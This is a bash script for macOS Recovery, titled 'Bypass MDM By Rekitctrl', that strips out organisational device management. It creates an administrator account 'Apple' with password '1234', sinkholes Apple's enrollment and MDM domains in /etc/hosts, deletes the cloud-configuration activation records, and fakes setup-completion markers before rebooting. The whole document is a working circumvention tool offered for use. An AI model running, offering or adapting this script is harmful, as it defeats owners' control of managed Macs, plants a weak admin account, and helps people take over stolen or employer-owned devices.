#!/bin/bash

# Define color codes
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
PUR='\033[1;35m'
CYAN='\033[1;36m'
NC='\033[0m'

# Display header
echo -e "${CYAN}Bypass MDM By Rekitctrl${NC}"
echo ""

# Bypass MDM from Recovery
echo -e "${YEL}Bypass MDM from Recovery"
if [ -d "/Volumes/Macintosh HD - Data" ]; then
    diskutil rename "Macintosh HD - Data" "Data"
fi

# Create Temporary User
echo -e "${NC}Creating a Temporary User"
realName="Apple"
username="Apple"
passw="1234"

# Create User
dscl_path='/Volumes/Data/private/var/db/dslocal/nodes/Default'
echo -e "${GREEN}Creating Temporary User"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UserShell "/bin/zsh"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" RealName "$realName"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" UniqueID "501"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" PrimaryGroupID "20"
mkdir "/Volumes/Data/Users/$username"
dscl -f "$dscl_path" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username"
dscl -f "$dscl_path" localhost -passwd "/Local/Default/Users/$username" "$passw"
dscl -f "$dscl_path" localhost -append "/Local/Default/Groups/admin" GroupMembership $username

# Block MDM domains
echo "0.0.0.0 deviceenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 mdmenrollment.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 iprofiles.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 gdmf.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 acmdm.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 albert.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 mdm.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 mdmenroll.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 mdmcheckin.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo "0.0.0.0 school.apple.com" >>/Volumes/Macintosh\ HD/etc/hosts
echo -e "${GRN}Successfully blocked MDM & Profile Domains"

# Remove configuration profiles
touch /Volumes/Data/private/var/db/.AppleSetupDone
rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigHasActivationRecord
rm -rf /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound
touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled
touch /Volumes/Macintosh\ HD/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordNotFound

echo -e "${GRN}MDM enrollment has been bypassed${NC}"
echo -e "${NC}Rebooting...${NC}"
sleep 5
reboot
